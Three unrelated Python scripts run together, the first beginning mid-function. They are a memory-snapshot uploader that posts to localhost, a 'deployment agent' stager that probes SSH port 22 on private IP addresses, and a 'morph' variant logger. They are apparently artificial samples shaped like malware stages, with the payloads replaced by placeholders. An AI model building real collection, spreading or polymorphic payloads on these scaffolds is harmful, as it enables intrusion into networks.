    """Write memory usage information to a local file."""
    try:
        file_path = os.path.join(os.getcwd(), filename)
        with open(file_path, "w", encoding="utf-8") as file:
            for key, value in data.items():
                file.write(f"{key}: {value}\n")
    except Exception as e:
        print(f"Error writing to file: {e}")
        traceback.print_exc()

def send_memory_info_to_server(data, server_url, retries=3, verbose=False):
    """Send memory usage information to a remote server."""
    for attempt in range(retries):
        try:
            if verbose:
                print(f"Attempt {attempt + 1} to send data to server: {server_url}")

            parsed_url = urllib.parse.urlparse(server_url)
            host = parsed_url.netloc
            path = parsed_url.path or "/"

            connection = http.client.HTTPConnection(host)
            headers = {"Content-Type": "application/json"}
            connection.request("POST", path, body=json.dumps(data), headers=headers)
            response = connection.getresponse()

            if response.status == 200:
                if verbose:
                    print(f"Data successfully sent to {server_url}")
                return True  # Successfully sent
            else:
                if verbose:
                    print(f"Server responded with status: {response.status} {response.reason}")
        except Exception as e:
            print(f"Error sending data to server: {e}")
            if verbose:
                traceback.print_exc()
        finally:
            try:
                connection.close()
            except Exception:
                pass  # Ignore connection close errors
    print(f"Failed to send data to server after {retries} retries")
    return False

def main():
    """Main function to execute the program."""
    # Default configuration
    server_url = "http://localhost:8080/memory"
    retries = 3
    verbose = True  # Enable verbose logging for debugging

    print("Memory Snapshot Tool initialized")

    # Step 1: Get memory usage information
    memory_info = get_memory_info()

    # Log if memory info retrieval failed
    if "error" in memory_info:
        print(memory_info["error"])
        os._exit(1)  # Exit with error code

    # Step 2: Write the memory information to a local file
    write_memory_info_to_file(memory_info)

    print("Memory usage information written to memory_dump.txt")

    # Step 3: Send the memory information to the server
    success = send_memory_info_to_server(memory_info, server_url, retries, verbose)

    if success:
        print("Memory usage information successfully sent to server.")
    else:
        print("Failed to send memory usage information to server.")

    print("Memory Snapshot Tool completed")
    os._exit(0)  # Exit the program cleanly

if __name__ == "__main__":
    main()

import os
import shutil
import socket
import time
import logging

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def create_staging_directory(staging_dir):
    logging.info(f"Ensuring '{staging_dir}' directory exists.")
    try:
        os.makedirs(staging_dir, exist_ok=True)
    except Exception as e:
        logging.error(f"Failed to create staging directory: {e}")
        raise

def create_placeholder_file(agent_file):
    try:
        if not os.path.exists(agent_file):
            logging.info(f"Creating placeholder file '{agent_file}'.")
            with open(agent_file, 'w') as f:
                f.write('Deployment agent placeholder content\n')
    except Exception as e:
        logging.error(f"Failed to create placeholder file: {e}")
        raise

def copy_placeholder_to_staging(agent_file, staging_dir):
    try:
        logging.info(f"Copying '{agent_file}' to '{staging_dir}'.")
        shutil.copy(agent_file, staging_dir)
    except Exception as e:
        logging.error(f"Failed to copy placeholder file to staging: {e}")
        raise

def attempt_connection(ip, retries):
    for attempt in range(retries):
        try:
            logging.info(f"Attempting to connect to {ip} (attempt {attempt + 1}/{retries}).")
            with socket.create_connection((ip, 22), timeout=5):
                logging.info(f"Connection to {ip} succeeded.")
                return True
        except (socket.timeout, socket.error) as e:
            logging.warning(f"Connection to {ip} failed (attempt {attempt + 1}/{retries}): {e}. Retrying...")
            time.sleep(min(2 ** attempt, 30))  # Exponential backoff with cap
    logging.error(f"All connection attempts to {ip} failed.")
    return False

def write_results(results, results_file):
    try:
        logging.info(f"Writing connection results to '{results_file}'.")
        with open(results_file, 'w') as f:
            for ip, status in results.items():
                f.write(f'{ip}: {status}\n')
    except Exception as e:
        logging.error(f"Failed to write connection results: {e}")
        raise

def validate_ip_addresses(ip_addresses):
    valid_ips = []
    for ip in ip_addresses:
        try:
            socket.inet_aton(ip)  # Validate IPv4 address
            valid_ips.append(ip)
        except socket.error:
            logging.warning(f"Invalid IP address skipped: {ip}")
    return valid_ips

def package_deployment_agent(ip_addresses, retries):
    staging_dir = 'staging'
    agent_file = 'deployment_agent.txt'
    results_file = os.path.join(staging_dir, 'connection_results.txt')

    try:
        # Validate IP addresses
        ip_addresses = validate_ip_addresses(ip_addresses)

        # Setup staging directory and deployment agent file
        create_staging_directory(staging_dir)
        create_placeholder_file(agent_file)
        copy_placeholder_to_staging(agent_file, staging_dir)

        # Perform connections and record results
        results = {}
        for ip in ip_addresses:
            success = attempt_connection(ip, retries)
            results[ip] = 'success' if success else 'failure'

        # Write results to file
        write_results(results, results_file)
    except Exception as e:
        logging.error(f"An error occurred during deployment: {e}")

def main():
    # Default IP addresses and retry attempts
    default_ips = ['192.168.1.1', '192.168.1.2', '10.0.0.1', '256.256.256.256']  # Includes an invalid IP for testing
    default_retries = 3

    # Setup logging
    setup_logging()

    # Run the utility
    package_deployment_agent(default_ips, default_retries)

if __name__ == '__main__':
    main()

import uuid
import hashlib
from datetime import datetime

LOG_FILE = "morph_log.txt"
DEFAULT_VARIANTS = ["variantA", "variantB", "variantC"]
MAX_VARIANTS_TO_PROCESS = 10

def generate_unique_id(variant):
    """Generate a unique hashed ID for a given variant using UUID and variant string."""
    unique_string = f"{variant}-{uuid.uuid4()}"
    return hashlib.md5(unique_string.encode()).hexdigest()

def log_variant_event(variant, log_file):
    """Log the variant processing event with a timestamp and unique ID."""
    try:
        timestamp = datetime.utcnow().isoformat()
        unique_id = generate_unique_id(variant)
        log_entry = f"variant: {variant}, timestamp: {timestamp}, unique_id: {unique_id}\n"
        with open(log_file, "a") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Error logging variant {variant}: {e}")

def process_variants(variants, log_file, max_variants):
    """Process a list of variants, logging events for each, up to a specified maximum."""
    count = 0
    for variant in variants:
        if count >= max_variants:
            break
        try:
            print(f"Processing variant: {variant}")
            log_variant_event(variant, log_file)
            count += 1
        except Exception as e:
            print(f"Error processing variant {variant}: {e}")
    return count

def main():
    """Main function to execute the variant processing."""
    try:
        variants = DEFAULT_VARIANTS  # Use default variants
        processed_count = process_variants(variants, LOG_FILE, MAX_VARIANTS_TO_PROCESS)
        print(f"{processed_count} variants processed successfully. Log file: {LOG_FILE}")
    except Exception as e:
        print(f"An error occurred in the main function: {e}")

if __name__ == "__main__":
    main()
